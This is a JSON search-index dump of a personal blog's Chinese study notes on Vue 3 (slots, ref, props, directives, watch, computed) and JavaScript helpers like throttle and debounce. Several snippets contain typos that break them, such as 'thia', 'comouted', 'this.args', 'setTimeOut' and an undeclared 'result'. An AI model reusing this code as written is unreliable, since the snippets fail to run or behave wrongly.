&lt;/div&gt; &lt;/Category&gt;子组件： &lt;template&gt; &lt;div&gt; &lt;slot&gt;插槽默认内容&lt;/slot&gt; &lt;/div&gt; &lt;/template&gt; 2 具名插槽 1234567891011121314151617181920212223242526父组件： &lt;Category&gt; &lt;template #header&gt; &lt;div&gt; html结构 &lt;/div&gt; &lt;/template&gt; &lt;template slot=&quot;center&quot;&gt; &lt;div&gt; html结构 &lt;/div&gt; &lt;/template&gt; &lt;template v-slot:footer&gt; &lt;div&gt; html结构 &lt;/div&gt; &lt;/template&gt; &lt;/Category&gt;子组件： &lt;template&gt; &lt;div&gt; &lt;slot name=&quot;center&quot;&gt;插槽默认内容&lt;/slot&gt; &lt;slot name=&quot;footer&quot;&gt;插槽默认内容&lt;/slot&gt; &lt;/div&gt; &lt;/template&gt; 3 作用域插槽 理解：数据在组件的自身，但根据数据生成的结构需要组件的使用者决定，(games数据在Category组件中，但使用数据所遍历的结构由App组件决定) 12345678910111213141516171819202122232425262728293031323334353637383940414243父组件：&lt;Category title=&quot;游戏&quot;&gt; &lt;template v-slot=&quot;&#123;games&#125;&quot;&gt; &lt;ul&gt; &lt;li v-for=&quot;(game,index) in games&quot; :key=&quot;index&quot;&gt; &#123;&#123;game&#125;&#125; &lt;/li&gt; &lt;/ul&gt; &lt;/template&gt;&lt;/Category&gt;&lt;Category title=&quot;游戏&quot;&gt; &lt;template v-slot=&quot;&#123;games&#125;&quot;&gt; &lt;ol&gt; &lt;li v-for=&quot;(game,index) in games&quot; :key=&quot;index&quot;&gt; &#123;&#123;game&#125;&#125; &lt;/li&gt; &lt;/ol&gt; &lt;/template&gt;&lt;/Category&gt;子组件：&lt;template&gt;&lt;div&gt; &lt;h3&gt;&#123;&#123;title&#125;&#125;分类&lt;/h3&gt; &lt;slot :games=&quot;games&quot;&gt;&lt;/slot&gt;&lt;/div&gt; &lt;/template&gt;&lt;script&gt;import &#123;reactive&#125; from &quot;vue&quot;export default &#123; name:&#x27;Category&#x27;, props:[&#x27;title&#x27;], setup()&#123; let games=reactive([&#x27;红色警戒&#x27;,&#x27;超级玛丽&#x27;,&#x27;穿越火线&#x27;,&#x27;魂斗罗&#x27;]) return&#123; games &#125; &#125;&#125;&lt;/script&gt;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"ref函数","slug":"ref函数","date":"2022-01-27T07:38:53.000Z","updated":"2022-02-01T09:52:15.436Z","comments":true,"path":"2022/01/27/ref函数/","link":"","permalink":"https://coloey.github.io/2022/01/27/ref%E5%87%BD%E6%95%B0/","excerpt":"","text":"ref函数：作用：定义一个响应式函数 语法：const xxx=ref(initValue) 创建一个包含响应式数据的引用对象（reference对象，简称ref对象) JS中操作数据：xxx.value 模板中读取数据，不需要.value,直接 Ps: 接收的数据类型可以是：基本类型也可以是对象类型 基本类型的数据：响应式依然是靠Object.defineProperty()的get与set完成 对象基本类型的数据：内部是求助了Vue3中的一个新函数——reactive函数 ref与reactive对比：定义数据角度：ref用来定义：基本类型数据 reactive用来定义：对象（或数组类型数据） PS：ref也可以用来定义对象（或数组）类型数据，它内部会自动通过reactive转为代理对象 从原理角度对比：ref通过Object.defineProperty()的getter和setter来实现响应式（数据劫持） reactive通过使用Proxy来实现响应式，并通过Reflect操作源对象内部的数据 使用角度对比：ref定义的数据，操作数据需要通过.value,读取数据时模板直接读取不需要.value reactive定义的数据操作数据与读取数据均不需要.value 响应式数据的判断isRef:检查一个值是否为一个ref对象 isReactive:检查一个对象是否由reactive创建的响应式代理 isReadonly:检查一个对象是否由readonly创建的只读代理 isProxy:检查一个对象是否由reactive或者readonly方法创建的代理","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"props","slug":"props","date":"2022-01-27T04:14:42.000Z","updated":"2022-01-27T05:34:36.203Z","comments":true,"path":"2022/01/27/props/","link":"","permalink":"https://coloey.github.io/2022/01/27/props/","excerpt":"","text":"配置项:props 功能：让组件接收外部传来的数据 （1）传递数据： 第一种方式（只接收）：props:[‘name’] 第二种方式（限制类型）：props:{name:String} 第三种方式（限制类型，限制必要性，指定默认值）： props:{ ​ name:{ ​ type:String,//类型 ​ required:true,//必要性 ​ dedault:’老王’//默认值 ​ } } Ps:props是只读的，vue底层会监视你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后修改data中的数 eg:data(){ return{ myName:this.myName } }","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"生命周期钩子","slug":"生命周期钩子","date":"2022-01-26T02:13:45.000Z","updated":"2022-01-26T02:20:22.472Z","comments":true,"path":"2022/01/26/生命周期钩子/","link":"","permalink":"https://coloey.github.io/2022/01/26/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90/","excerpt":"","text":"beforeCreate,created,beforeMount,mounted,beforeUpdated,updated,beforeUnmount,unmounted 常用生命周期钩子:mounted:发送ajax请求，启动定时器，绑定自定义事件，订阅消息等【初始化操作】 beforeUnmount:清除定时器，解绑自定义事件，取消订阅消息等【收尾工作】 关于销毁实例： 1销毁后借助Vue开发者工具看不到任何信息 2 销毁后自定义事件失效，但原生DOM事件依然有效 3 一般不会在beforeUnmount操作数据，因为即使操作数据，也不会触发更新流程了","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"自定义指令","slug":"自定义指令","date":"2022-01-25T09:14:32.000Z","updated":"2022-01-25T09:39:59.802Z","comments":true,"path":"2022/01/25/自定义指令/","link":"","permalink":"https://coloey.github.io/2022/01/25/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/","excerpt":"","text":"自定义指令1.语法：（1） 局部指令：​ directives:{指令名：配置对象}或 directives：{指令名:回调函数} （2）全局指令：Vue.directive(指令名，配置对象)或Vue.directive(指令名，回调函数) 2.配置对象中常用的回调created：在绑定元素的 attribute 或事件监听器被应用之前调用。在指令需要附加在普通的 v-on 事件监听器调用前的事件监听器中时，这很有用。` beforeMount：当指令第一次绑定到元素并且在挂载父组件之前调用。mounted：指令与元素成功绑定时使用 updated:在包含组件的 VNode 及其子组件的 VNode 更新后调用。 beforeUpdate：在更新包含组件的 VNode 之前调用。 beforeUnmount：在卸载绑定元素的父组件之前调用 unmounted：当指令与元素解除绑定且父组件已卸载时，只调用一次。 PS:指令定义时不加v-,，但是使用时要加v- 指令名如果是多个单词要用kebab-case命名方式，不要用camelCase命名 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 &lt;div id=&quot;root&quot;&gt; &lt;h3&gt;&#123;&#123;name&#125;&#125;&lt;/h3&gt; &lt;h3&gt;当前n:&lt;span v-text=&quot;n&quot;&gt;&#123;&#123;n&#125;&#125;&lt;/span&gt;&lt;/h3&gt; &lt;h3&gt;放大10倍后的n：&lt;span v-big=&quot;n&quot;&gt;&#123;&#123;n&#125;&#125;&lt;/span&gt;&lt;/h3&gt; &lt;button @click=&quot;n++&quot;&gt;点我n+1&lt;/button&gt; &lt;br&gt; &lt;input type=&quot;text&quot; v-fbind:value=&quot;n&quot;&gt; &lt;/div&gt;&lt;script src=&quot;https://unpkg.com/vue@next&quot;&gt;&lt;/script&gt; &lt;script&gt; Vue.createApp(&#123; data()&#123; return&#123; name:&quot;ann&quot;, n:1 &#125; &#125;, directives: &#123; //v-big被调用：指令与元素成功绑定时（一上来） 指令所在模板重新编译时 big(element,binding)&#123; element.innerText=binding.value*10 &#125;, /*fbind(element,binding)&#123; element.value=binding.value element.focus() &#125;,*/ fbind:&#123; // 当被绑定的元素挂载到 DOM 中时…… mounted(element,binding)&#123; console.log(this) element.value=binding.value element.focus() &#125;, updated(element,binding)&#123; element.value=binding.value &#125; &#125; &#125; &#125;).mount(&quot;#root&quot;) &lt;/script&gt;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"内置指令","slug":"内置指令","date":"2022-01-25T05:58:47.000Z","updated":"2022-01-25T07:45:44.154Z","comments":true,"path":"2022/01/25/内置指令/","link":"","permalink":"https://coloey.github.io/2022/01/25/%E5%86%85%E7%BD%AE%E6%8C%87%E4%BB%A4/","excerpt":"","text":"v-html:1 作用：向指定节点中渲染包含html的内容 2 与插值语法的区别： （1）v-html会替换掉节点中所有内容，则不会 （2）v-html可以识别html结构 3 严重注意：v-html有安全性问题 （1）在网站上动态渲染任意HTML非常危险，容易导致XSS攻击 （2）一定要在可信内容上使用v-html，永远不要用在用户提交的内容上 v-cloak(没有值)1 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性 2 使用css配合一个v-clock可以解决网速慢时页面展示出的问题 123456789101112131415161718&lt;style&gt; [v-cloak]&#123; display:none &#125;&lt;/style&gt; &lt;h2 v-cloak&gt;&#123;&#123;name&#125;&#125;&lt;/h2&gt; &lt;div&gt; &lt;script&gt;&lt;/script&gt;//延迟5秒的服务器 &lt;/div&gt; &lt;script&gt; Vue.createApp(&#123; data()&#123; return&#123; name:&#x27;Ann&#x27; &#125; &#125; &#125;) &lt;/script&gt; v-once: v-once 节点在初次动态渲染后，就被视为静态内容 以后数据改变不会引起v-once所在结构的更新，可以用于优化性能 v-pre:1.跳过其所在节点的编译过程 2.可利用它跳过没有使用指令语法，插值语法的节点，加快编译","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"收集表单数据","slug":"收集表单数据","date":"2022-01-25T03:09:55.000Z","updated":"2022-01-25T06:30:01.780Z","comments":true,"path":"2022/01/25/收集表单数据/","link":"","permalink":"https://coloey.github.io/2022/01/25/%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE/","excerpt":"","text":"收集表单数据： ,v-model收集的死是value值，用户输入的是value值 ,v-model收集的是value值，且给标签配置value值 (1）没有配置input的value属性，收集的是checked(true/false) (2)配置input的value属性： 若v-model的初始值是非数组，收集的是checked(true/false) 若v-model的初始值是数组，收集的是value组成的数组 PS： v-model有三个修饰符： lazy:失去焦点再收集数据 number:把输入的字符串转为有效数字 trim: 输入首尾空格过滤","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"Node.js基础","slug":"Node-js基础","date":"2022-01-24T13:57:44.000Z","updated":"2022-04-12T14:03:59.192Z","comments":true,"path":"2022/01/24/Node-js基础/","link":"","permalink":"https://coloey.github.io/2022/01/24/Node-js%E5%9F%BA%E7%A1%80/","excerpt":"","text":"Node.js运行时结构： 1 异步IO 当Node.js执行I/O操作时，会在响应返回后恢复操作，而不是阻止线程并占用额外内存等待 2 单线程 实际JS线程+uv线程池+V8任务线程池+V8inspector线程 优点：不用考虑多线程同步问题，也就不需要锁，同时还能比较高效的利用系统资源 缺点：阻塞会产生负面影响，解决方法：多进程或多线程 3 跨平台 Node.js跨平台+JS无需编译环境（Web跨平台，诊断工具跨平台）","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"}],"tags":[]},{"title":"Vue监视数据原理","slug":"Vue监视数据原理","date":"2022-01-24T10:24:05.000Z","updated":"2022-01-25T01:45:04.281Z","comments":true,"path":"2022/01/24/Vue监视数据原理/","link":"","permalink":"https://coloey.github.io/2022/01/24/Vue%E7%9B%91%E8%A7%86%E6%95%B0%E6%8D%AE%E5%8E%9F%E7%90%86/","excerpt":"","text":"Vue监视数据原理1 Vue会监视data中所有层次的数据（递归） 2 如何监视对象中的数据？ 通过setter实现监视，且要在new Vue的时候就传入要监测的数据。 （1）对象中后追加的属性，Vue默认不做响应式处理 （2）如需给后续添加的属性左响应式，请使用下面的API: ​ Vue.set(target,propertyName/index,value):target不允许是Vue实例或者vm中的data对象 vm.$set(target,propertyName/index,value) 3 如何监测数组中的数据？ 通过包裹数组更新元素的方法实现，本质做了两件事： （1） 调用原生对应的方法对数组进行更新 （2） 重新解析模板，进而更新页面 4 在Vue中修改数组中的某个元素一定要用如下方法： （1）使用这些API：push(),shift(),unshift(),splice(),sort(),reverse() （2）Vue.set()或vm.$set() 非变更方法，例如 filter()、concat() 和 slice()。它们不会变更原始数组，而总是返回一个新数组。当使用非变更方法时，可以用新数组替换旧数组：","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"key作用与原理","slug":"key作用与原理","date":"2022-01-24T05:48:50.000Z","updated":"2022-03-21T06:52:14.947Z","comments":true,"path":"2022/01/24/key作用与原理/","link":"","permalink":"https://coloey.github.io/2022/01/24/key%E4%BD%9C%E7%94%A8%E4%B8%8E%E5%8E%9F%E7%90%86/","excerpt":"","text":"key的内部原理1 虚拟DOM中key的作用： key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，随后Vue进行【新虚拟DOM】和【旧虚拟DOM】的对比，对比规则如下： 2 对比规则： （1）旧虚拟DOM中找到与新虚拟DOM相同的key： 若虚拟DOM中内容不变，则直接使用之前的真实DOM 若虚拟DOM中内容变了，则生成新的真实DOM，随后替换页面中的真实 DOM （2）旧虚拟DOM中未找到与新虚拟DOM相同的key，创建新的真实DOM，随后渲染到页面 3 用index作为key可能会引发的问题： （1）若对数据进行逆序添加，逆序删除等操作： 会产生没有必要的真实DOM更新==&gt;界面效果没问题，但是效率低 （2）如果结构中还包含输入类DOM： 会产生错误的DOM更新==&gt;界面有问题 4 开发中如何选择key? (1)最好使用每条数据的唯一标识作为key,比如id,身份证号，手机号等唯一值 (2)如果不存在对数据的逆序添加，逆序删除等破坏顺序的操作，仅用于渲染列表用于展示，使用index作为key是没有问题的","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"条件渲染","slug":"条件渲染","date":"2022-01-24T05:22:02.000Z","updated":"2022-01-24T05:48:38.577Z","comments":true,"path":"2022/01/24/条件渲染/","link":"","permalink":"https://coloey.github.io/2022/01/24/%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93/","excerpt":"","text":"条件渲染1 v-if: 写法： (1). v-if=”表达式” (2) v-else-if=”表达式” (3) v-else 适用于：切换频率较低的情景 特点：不展示的DOM元素直接被移除 注意：v-if和v-else-if,v-else一起使用时要求结构不能被打断 2 v-show 写法： v-show=”表达式” 适用于：切换频率较高的场景 特点：不展示的DOM元素未被移除，使用display=none隐藏掉 PS： 1 使用v-if时，元素可能无法获取到，而使用v-show一定可以获取到 2 v-if可以和template配合使用","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"绑定class样式","slug":"绑定class样式","date":"2022-01-24T03:39:15.000Z","updated":"2022-01-24T05:18:30.948Z","comments":true,"path":"2022/01/24/绑定class样式/","link":"","permalink":"https://coloey.github.io/2022/01/24/%E7%BB%91%E5%AE%9Aclass%E6%A0%B7%E5%BC%8F/","excerpt":"","text":"绑定class样式12345678910111213141516171819202122232425262728293031323334 &lt;div id=&quot;demo&quot;&gt; &lt;!-- 绑定class样式--字符串写法，适用于样式类名不确定。需要动态确定 --&gt; &lt;div class=&quot;basic&quot; :class=&quot;mood&quot; @click=&quot;changeMood&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt; &lt;!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定，名字也不确定 --&gt; &lt;div class=&quot;basic&quot; :class=&quot;classArr&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt; &lt;!-- 绑定class样式--对象写法，适用于：要绑定的样式个数确定，名字也确定，但要动态决定用不用 --&gt; &lt;div class=&quot;basic&quot; :class=&quot;classObj&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/div&gt; &lt;/div&gt;&lt;script src=&quot;https://unpkg.com/vue@next&quot;&gt;&lt;/script&gt; &lt;script&gt; Vue.config.productionTip = false Vue.createApp(&#123; data()&#123; return&#123; name:&#x27;Ann&#x27;, mood:&#x27;normal&#x27;, classArr:[&#x27;c1&#x27;,&#x27;c2&#x27;,&#x27;c3&#x27;], classObj:&#123; &#x27;c1&#x27;:false, &#x27;c2&#x27;:false, &#125; &#125; &#125;, methods:&#123; changeMood()&#123; const arr=[&#x27;happy&#x27;,&#x27;sad&#x27;,&#x27;normal&#x27;] this.mood=arr[Math.floor(Math.random()*3)] &#125; &#125; &#125;).mount(&#x27;#demo&#x27;) &lt;/script&gt; 绑定style样式1 :style=”{fontSize: xxx}”,其中xxx是动态值","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"watch和computed区别","slug":"watch和computed区别","date":"2022-01-24T02:41:52.000Z","updated":"2022-01-24T02:55:41.453Z","comments":true,"path":"2022/01/24/watch和computed区别/","link":"","permalink":"https://coloey.github.io/2022/01/24/watch%E5%92%8Ccomputed%E5%8C%BA%E5%88%AB/","excerpt":"","text":"computed和watch的区别:1 computed能完成的功能watch也能完成 2 watch能完成的功能computed不一定能完成，例如watch能完成异步操作 PS： 1 所有被Vue管理的函数要写成普通函数，这样new Vue的实例的时候this才能绑定到新创建的vm或组件实例对象 2 所有不被Vue管理的函数比如（定时器的回调函数，ajax的回调函数和Promise的回调函数）最好写成箭头函数，箭头函数的this绑定会继承外层函数的this绑定 12345678910111213141516171819202122Vue.createApp(&#123; data()&#123; return &#123; firstName:&quot;张&quot;, lastName:&quot;三&quot;, fullName:&quot;张三&quot; &#125; &#125; watch:&#123; firstName(val)&#123; setTimeout(()=&gt;&#123; this.fullName=val+this.lastName&#125;,1000) &#125;, lastName(val)&#123; setTimeout(()=&gt;&#123; this.fullName=thia.firstName+val&#125;,1000) &#125; &#125;&#125;)","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"computed","slug":"computed","date":"2022-01-23T14:45:11.000Z","updated":"2022-01-30T14:46:44.584Z","comments":true,"path":"2022/01/23/computed/","link":"","permalink":"https://coloey.github.io/2022/01/23/computed/","excerpt":"","text":"计算属性1 定义： 要用的属性不存在，要通过已有的属性计算得来 2 原理： 底层借助了Object.defineproperty()方法提供的getter和setter。 3 get函数什么时候执行 (1) 初次读取时会执行一次 (2)当依赖的数据发生改变时会被再次调用 4 优势：与methods相比。内部有缓存机制，效率更高，调试方便 5 计算属性最终会出现在vm中，直接读取使用即可 如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变 简写：函数 Vue3中12345678910111213141516171819setup()&#123; //计算属性简写let fullName=computed(()=&gt;&#123; return person.firstName+&quot;-&quot;+person.lastName&#125;)//计算属性完整let fullName=comouted(&#123; get()&#123; return person.firstName+&quot;-&quot;+person.lastName &#125; set(val)&#123; const nameArr=value.split(&quot;-&quot;) person.firstName=nameArr[0] person.lastName=nameArr[1] &#125;&#125;)&#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"事件处理","slug":"事件处理","date":"2022-01-23T10:35:27.000Z","updated":"2022-01-23T14:23:07.968Z","comments":true,"path":"2022/01/23/事件处理/","link":"","permalink":"https://coloey.github.io/2022/01/23/%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86/","excerpt":"","text":"事件的基本使用： 使用v-on:xxx或@xxx绑定事件，其中xxx是事件名 事件的回调需要配置在methods对象中，最终会在vm上 methods中配置的函数，不要用箭头函数，否则this就不是vm methods中配置的函数，都是被Vue管理的函数，this的指向是vm或组件实例对象 @click=”demo”和@click=”demo($event)”效果一致，但后者可以传参 事件修饰符prevent:阻止默认事件 stop：阻止事件冒泡 once:事件只触发一次 键盘事件1 Vue常用按键别名： 回车：enter 删除：delete 退出：esc 空格：space 换行：tab(特殊，必须配合keydown使用) 上：up 下:down 左:left 右:right 2 Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为keb-case(短横线命名) 3 系统修饰符(用法特殊):ctrl,alt,shift,meta (1)配合keyup使用：按下修饰键的同时再按下其他键，随后释放其他键，事件才被触发 (2)配合keydown使用：正常触发事件 4 也可以使用keyCode去指定具体的键 5 Vue.config.keyCode自定义键名=键码，可以定制按键别名","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"数据代理","slug":"数据代理","date":"2022-01-23T09:50:13.000Z","updated":"2022-01-24T10:26:42.258Z","comments":true,"path":"2022/01/23/数据代理/","link":"","permalink":"https://coloey.github.io/2022/01/23/%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86/","excerpt":"","text":"Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读或写 Vue中数据代理的好处：更加方便操作data中的数据 基本原理 ​ 通过Object.defineProperty()把data对象中的所有属性添加到vm上中，为每一个添加到vm上的属性都指定一个getter()setter()函数，在getter()setter()函数；里面去操作data中对应的数据 12345678910111213141516171819202122232425262728293031323334353637383940414243 const vm=Vue.createApp(&#123; data()&#123; return&#123; name:&#x27;Ann&#x27;, address:&#x27;06404&#x27; &#125; &#125; &#125;)vm&#123;..._data&#123; name:(...), address:(...), &#125;name:(...)address:(...)//Object.defineProperty()Object.defineProperty(vm,&#x27;name&#x27;,&#123; value:_data.name.get() enumerable: writable: configurable://默认为false,控制属性是否可以被删除 get()&#123; return _data.name.get() &#125; set(value)&#123; _data.name.set(value) &#125;&#125;)Object.defineProperty(vm,&#x27;address&#x27;,&#123; value:_data.address.get() enumerable: writable: configurable://默认为false,控制属性是否可以被删除 get()&#123; return _data.address.get() &#125; set(value)&#123; _data.address.set(value); &#125;&#125;)&#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"MVVM","slug":"MVVM","date":"2022-01-23T08:23:36.000Z","updated":"2022-01-23T09:48:20.724Z","comments":true,"path":"2022/01/23/MVVM/","link":"","permalink":"https://coloey.github.io/2022/01/23/MVVM/","excerpt":"","text":"MVVM M:模型(Model) data中的数据 V：视图(View) 模板代码 VM:视图模型（ViewModel):Vue实例 data中的所有属性最后都出现在vm身上 vm上的所有属性及Vue原型上的所有属性，在Vue模板中都可以直接使用 12345678910&lt;div&gt;View&lt;/div&gt;const vm=Vue.createApp(&#123;//vm:VM data()&#123; return&#123; Model &#125; &#125;&#125;)","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"数据绑定","slug":"数据绑定","date":"2022-01-23T07:57:58.000Z","updated":"2022-01-23T08:05:06.352Z","comments":true,"path":"2022/01/23/数据绑定/","link":"","permalink":"https://coloey.github.io/2022/01/23/%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A/","excerpt":"","text":"数据绑定1. 单向绑定v-bind:数据只能从data流向页面 2.双向绑定v-model:数据不仅能从data流向页面，还能从页面流向data v-model:value的value可以简写为v-model,因为v-model默认收集的就是value值","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"模板语法","slug":"模板语法","date":"2022-01-23T07:36:44.000Z","updated":"2022-01-23T07:52:52.618Z","comments":true,"path":"2022/01/23/模板语法/","link":"","permalink":"https://coloey.github.io/2022/01/23/%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95/","excerpt":"","text":"Vue 模板语法1 插值语法功能：用于解析标签体内容 写法：，xxx是js表达式，直接读取js中的所有data属性 2 指令语法功能： 用于解析标签（包括标签属性，标签内容等） 举例：v-bind:href=”xxx”,简写为:href=”xxx”,xxx同样可以写js表达式，且可以直接读取到data里的所有属性 写法：v-xxx","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"高阶函数","slug":"高阶函数","date":"2022-01-17T06:06:06.000Z","updated":"2022-01-17T09:29:33.289Z","comments":true,"path":"2022/01/17/高阶函数/","link":"","permalink":"https://coloey.github.io/2022/01/17/%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0/","excerpt":"","text":"高阶函数模板12345function HoF0(fn)&#123; return function(...args)&#123; return fn.apply(this,args); &#125;&#125; Once123456789function once(fn)&#123; return function(..args)&#123; if(fn)&#123; const ret=fn.apply(this,args); fn=null; return ret; &#125; &#125;&#125; Throttle1234567891011121314151617function throttle(fn,time=500)&#123; let timer; return function(...args)&#123; if(timer==null)&#123; fn.apply(this.args); timer=setTimeout(()=&gt;&#123; timer=null; &#125;,time) &#125; &#125;&#125;btn.onclick=throttle(function(e)&#123; circle.innerHTML=parseInt(circle.innerHTML)+1; circle.className=&#x27;fade&#x27;; setTimeout(()=&gt;circle.className=&#x27;&#x27;,250);&#125;); Debouce123456789101112function debouce(fn,dur)&#123; dur=dur||100; var timer; return function()&#123; clearTimeout(timer); timer=setTimeOut(()=&gt;&#123; fn.apply(this,arguments); &#125;,dur); &#125;&#125; iterative12345678910111213function iterative(fn)&#123; return function(subject,...rest)&#123; if(isIterable(subject))&#123; const ret=[]; for(let obj of subject)&#123; ret.push(fn.apply(this,[obj,...rest])); &#125; return ret; &#125; return fn.apply(this,[subject,...rest]); &#125;&#125; 过程抽象 HOF 装饰器 命令式/声明式 洗牌算法：123456789101112131415161718192021function*draw(cards)&#123; const c=[...cards]; for(let i=c.length;i&gt;0;i--)&#123; const pIdx=Math.floor(Math.random()*i); [c[pIdx],c[i-1]]=[c[i-1],c[pIdx]]; yield c[i-1]; &#125;&#125;function generate(amount,count)&#123; if(count&lt;=1)return [amount]; const cards=Array(amount-1).fill(0).map((_,i)=&gt;i+1); const pick=draw(cards); for(let i=0;i&lt;count;i++)&#123; result.push(pick.next().value); &#125; result.sort((a,b)=&gt;a-b); for(let i=count-1;i&gt;0;i--)&#123; result[i]=result[i]-result[i-1]; &#125; return result;&#125;","categories":[],"tags":[]},{"title":"CSS组合","slug":"布局","date":"2022-01-17T02:19:52.000Z","updated":"2022-01-17T09:30:12.395Z","comments":true,"path":"2022/01/17/布局/","link":"","permalink":"https://coloey.github.io/2022/01/17/%E5%B8%83%E5%B1%80/","excerpt":"","text":"组合：直接组合： AB 满足A同时满足B eg:input:focus 后代组合：A B 选中B，如果它是A的子孙 eg:nav a 亲子组合：A&gt;B 选中B如果它是A的子元素 eg:section&gt;p 兄弟选择器 AB 选中B如果它在A后且和A同级 eg:h2p 相邻选择器： A+B 选中B，如果它紧跟在A后面 eg:h2+p","categories":[{"name":"HTML+CSS","slug":"HTML-CSS","permalink":"https://coloey.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"watch","slug":"watch","date":"2022-01-15T06:39:59.000Z","updated":"2022-01-30T15:44:57.822Z","comments":true,"path":"2022/01/15/watch/","link":"","permalink":"https://coloey.github.io/2022/01/15/watch/","excerpt":"","text":"watch()监视属性watch： 1 当被监视的属性变化时（也可以监视计算属性），回调函数自动调用，进行相关操作 2 监视的属性必须存在才能好进行监视 3 监视的两种写法： （1）在Vue.createApp时传入watch配置 （2）通过vm.$watch监视 4 深度监视 （1）Vue中的watch默认不监视对象内部值的改变（一层） （2）配置deep为true,可以检测对象内部值改变（多层） 监视多级结构中某个属性的变化：’number.a’ 监视多级结构中所有属性第1变化，用deep:true PS：（1）Vue自身可以检测对象内部值的改变但是Vue提供的watch默认不可以 （2）使用watch时根据数据的具体结构，决定是否采用深度监视 vm.$watch(expOrFn,callback,[options]) expOrFn:{string/Function} callback:{Function/Object} options:{Object} deep:{boolean} immediate:{boolean} 返回值：unwatch函数 用处：观察Vue实例上的一个表达式或者一个函数计算结果的变化，回调函数得到的参数为新值和旧值。表达式只接受简单的键路径，对于复杂表达式，用函数取代 12345678910111213141516171819202122232425262728293031323334//HTML&lt;div id=&quot;app&quot;&gt; &#123;&#123;a&#125;&#125;,&#123;&#123;b&#125;&#125;&lt;/div&gt;//键路径 &lt;script type=&quot;text/javascript&quot;&gt; var vm=new Vue(&#123; el:&quot;#app&quot;, data:&#123; a:&#123;value1:&#x27;hello&#x27;&#125;, b:&#123;value2:&#x27;beautiful&#x27;&#125; &#125; &#125;); vm.$watch(&#x27;b.value2&#x27;,function(newVal,oldVal)&#123; console.log(newVal,oldVal); &#125;); vm.b.value2=&#x27;bind&#x27;;//bind beautiful //修改对象内部的值但是侦听的是对象，对其属性或元素的更改不会触发侦听器，因为他们引用相同对象 vm.$watch(&#x27;a&#x27;,function(newVal,oldVal)&#123; console.log(newVal,oldVal); &#125;); vm.a.value1=&#x27;hei&#x27;;//没有侦听到//为了发现对象内部值的变化，可以在选项参数中指定 deep: true。这个选项同样适用于监听数组变更。 vm.$watch(&#x27;a&#x27;,function(newVal,oldVal)&#123; console.log(newVal,oldVal); &#125;,&#123;deep:true&#125;); vm.a.value1=&#x27;hei&#x27;;////在选项参数中指定 immediate: true 将立即以表达式的当前值触发回调 vm.$watch(&#x27;a&#x27;,function(newVal,oldVal)&#123; console.log(newVal,oldVal); &#125;,&#123;immediate:true&#125;); vm.a=&#123;&#125;//&#123;_ob_:Observer&#125;undefined &#123;_ob_:Observer&#125;&#123;_ob_:Observer&#125; &lt;/script&gt; 在带有immediate选项时不能在第一次回调时取消侦听给定的property 1234567const unwatch=vm.$watch( &#x27;a&#x27;, function(newVal,oldVal)&#123; console.log(newVal,oldVal); unwatch() &#125;,&#123;immediate:true&#125; )//报错 要在回调函数里调用一个取消侦听的函数应该先检查其函数的可用性 12345678let unwatch=null; unwatch=vm.$watch( &#x27;a&#x27;, function(newVal,oldVal)&#123; console.log(newVal,oldVal); if(unwatch)&#123;unwatch();&#125; &#125;,&#123;immediate:true&#125; ) 